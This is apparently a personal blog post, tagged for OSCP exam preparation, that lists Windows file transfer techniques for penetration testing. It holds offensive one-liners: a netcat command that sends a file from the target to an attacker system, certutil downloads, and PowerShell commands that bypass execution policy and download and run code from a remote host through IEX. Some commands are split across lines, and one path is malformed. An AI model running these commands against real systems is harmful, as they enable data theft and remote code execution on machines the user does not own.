---
title: Windows File Transfers
author: linatl
date: "2021-03-10 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---

###### Start a webserver
```
Python3
> sudo python3 -m http.server 80
Python2
> sudo python -m SimpleHTTPServer 80
```

###### SMBserver
```
impacket-smbserver.py secure .
impacket-smbserver.py secure . -smb2support
```

###### netcat
```
On the attacker system:
> nc -lvp 80 > file.txt
On the target system:
> nc 192.168.1.1 80 < file.txt
```

###### certutil
```
> certutil.exe -urlcache -f http://192.168.1.1/file.txt file.txt
```

###### Powershell
```
Download
> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.1/file.exe', 'C\file.exe')

Execute
> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoPro
file -File file.ps1

Download and execute
> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('
http://192.168.1.1/file.exe')
```
